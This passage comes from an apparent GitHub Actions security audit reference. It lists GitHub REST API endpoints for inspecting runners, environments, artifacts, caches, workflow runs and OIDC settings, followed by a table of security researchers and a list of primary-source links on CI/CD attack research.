GET /orgs/{org}/actions/runners                                # Org-level runners
GET /repos/{owner}/{repo}/actions/runners/{id}                 # Runner details
```

### Environments
```
GET /repos/{owner}/{repo}/environments                         # List environments
GET /repos/{owner}/{repo}/environments/{name}                  # Environment protection rules
GET /repos/{owner}/{repo}/environments/{name}/deployment-branch-policies  # Branch restrictions
```

### Artifacts & Caches
```
GET /repos/{owner}/{repo}/actions/artifacts                    # List all artifacts
GET /repos/{owner}/{repo}/actions/runs/{id}/artifacts          # Per-run artifacts
GET /repos/{owner}/{repo}/actions/caches                       # List all caches
DELETE /repos/{owner}/{repo}/actions/caches/{id}               # Delete suspicious cache
```

### Workflow Runs (Runtime Monitoring)
```
GET /repos/{owner}/{repo}/actions/runs                         # List workflow runs
GET /repos/{owner}/{repo}/actions/runs/{id}                    # Run details
GET /repos/{owner}/{repo}/actions/runs/{id}/logs               # Download run logs
GET /repos/{owner}/{repo}/actions/runs/{id}/jobs               # List jobs in run
```

### OIDC
```
GET /repos/{owner}/{repo}/actions/oidc/customization/sub       # OIDC subject claim template
PUT /repos/{owner}/{repo}/actions/oidc/customization/sub       # Set subject template
```

### Repository Metadata
```
GET /repos/{owner}/{repo}                                       # Visibility (public/private)
GET /repos/{owner}/{repo}/branches/{branch}/protection          # Branch protection rules
```

### Security Advisories
```
GET /advisories?ecosystem=actions                               # Known action vulnerabilities
GET /repos/{owner}/{repo}/advisories                            # Repo-specific advisories
```

---

## 21. Key Researchers and References

### Researchers & Organizations

| Researcher / Organization | Contribution |
|---|---|
| **Adnan Khan** (adnanthekhan.com) | Cache poisoning (Cacheract), Black Hat/DEF CON 2024, Clinejection |
| **Teddy Katz** (Google Security Research) | ArtiPACKED artifact race condition, privilege escalation via artifacts |
| **John Stawinski** (Praetorian) | Self-hosted runner backdoors, CodeQLEAKED |
| **Legit Security** | State of GitHub Actions Security report, 7,000+ vulnerable workflows |
| **StepSecurity** | Harden-Runner runtime EDR, caught tj-actions breach |
| **Orca Security** | pull_request_nightmare research (Parts 1 & 2), CVE-2025-61671 |
| **Unit42 (Palo Alto)** | ArtiPACKED disclosure, tj-actions supply chain attack analysis |
| **GitHub Security Lab** | Preventing pwn requests series (Parts 1-4), CodeQL queries |
| **Synacktiv** | GitHub Actions exploitation series (introduction, untrusted input, self-hosted runners) |
| **Wiz** | GitHub-to-AWS keyless authentication flaws, hardening guide |
| **Datadog Security Labs** | GitHub-to-AWS OIDC misconfiguration research |
| **GitGuardian** | GhostAction campaign discovery (3,325 secrets), tj-actions analysis |
| **William Woodruff** (Trail of Bits) | Zizmor creator |

### Primary Sources

- [OpenSSF: Mitigating Attack Vectors in GitHub Workflows](https://openssf.org/blog/2024/08/12/mitigating-attack-vectors-in-github-workflows/)
- [GitHub Security Lab: Untrusted Input](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- [GitHub Security Lab: Preventing PWN Requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Security Lab: New Vulnerability Patterns and Mitigations](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/)
- [GitHub Blog: Four Tips to Keep Workflows Secure](https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/)
- [GitHub Blog: How to Catch Workflow Injections](https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/)
- [GitHub Docs: Script Injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Docs: REST API for Actions Permissions](https://docs.github.com/en/rest/actions/permissions)
- [GitHub Changelog: pull_request_target Changes (Nov 2025)](https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/)
- [GitHub Changelog: SHA Pinning Policy (Aug 2025)](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/)
- [Adnan Khan: Cache Poisoning Research](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/)
- [Adnan Khan: Cacheract](https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/)
- [Adnan Khan: Clinejection](https://adnanthekhan.com/posts/clinejection/)
- [Unit42: ArtiPACKED](https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/)
- [Unit42: tj-actions Supply Chain Attack](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/)
- [Orca Security: pull_request_nightmare Part 1](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/)
- [Orca Security: pull_request_nightmare Part 2](https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/)
- [Wiz: GitHub Actions Security Guide](https://www.wiz.io/blog/github-actions-security-guide)
- [Wiz: tj-actions Supply Chain Attack](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066)
- [Datadog: GitHub-to-AWS Keyless Authentication Flaws](https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/)
- [Tinder: GitHub Actions & AWS OIDC Vulnerabilities](https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8)
- [GitGuardian: GhostAction Campaign](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
- [GitGuardian: GitHub Actions Security Cheat Sheet](https://blog.gitguardian.com/github-actions-security-cheat-sheet/)
- [Legit Security: GitHub Privilege Escalation](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)
- [Legit Security: State of GitHub Actions Security](https://www.legitsecurity.com/press-releases/the-state-of-github-actions-security)
- [StepSecurity: Harden-Runner](https://github.com/step-security/harden-runner)
- [StepSecurity: GitHub Actions Best Practices](https://www.stepsecurity.io/blog/github-actions-security-best-practices)
- [StepSecurity: Pinning Guide](https://www.stepsecurity.io/blog/pinning-github-actions-for-enhanced-security-a-complete-guide)
- [Synacktiv: GitHub Actions Exploitation (Untrusted Input)](https://www.synacktiv.com/en/publications/github-actions-exploitation-untrusted-input)
- [Synacktiv: GitHub Actions Exploitation (Self-Hosted Runners)](https://www.synacktiv.com/en/publications/github-actions-exploitation-self-hosted-runners)
- [Praetorian: Self-Hosted Runner Backdoors](https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/)
- [Praetorian: CodeQLEAKED](https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/)
- [Palo Alto: Unpinnable Actions](https://www.paloaltonetworks.com/blog/cloud-security/unpinnable-actions-github-security/)
- [Sysdig: Self-Hosted Runners as Backdoors](https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors)
- [Sysdig: Insecure Actions in MITRE, Splunk](https://www.sysdig.com/blog/insecure-github-actions-found-in-mitre-splunk-and-other-open-source-repositories)
- [DarkReading: Supply Chain Attacks Targeting GitHub Actions](https://www.darkreading.com/application-security/supply-chain-attacks-targeting-github-actions-increased-in-2025)
- [Snyk: Exploring Vulnerabilities in GitHub Actions](https://snyk.io/blog/exploring-vulnerabilities-github-actions/)
- [arXiv: Unpacking Security Scanners for GitHub Actions Workflows](https://arxiv.org/html/2601.14455v1)
- [Zizmor GitHub Repository](https://github.com/zizmorcore/zizmor)
- [OpenSSF Scorecard Checks Documentation](https://github.com/ossf/scorecard/blob/main/docs/checks.md)
- [OpenSSF Scorecard](https://scorecard.dev/)
- [Awesome GitHub Actions Security (curated list)](https://github.com/johnbillion/awesome-github-actions-security)
- [GitHub Well-Architected: Securing Actions Workflows](https://wellarchitected.github.com/library/application-security/recommendations/actions-security/)
- [CVE-2025-30066 (tj-actions/changed-files)](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3)
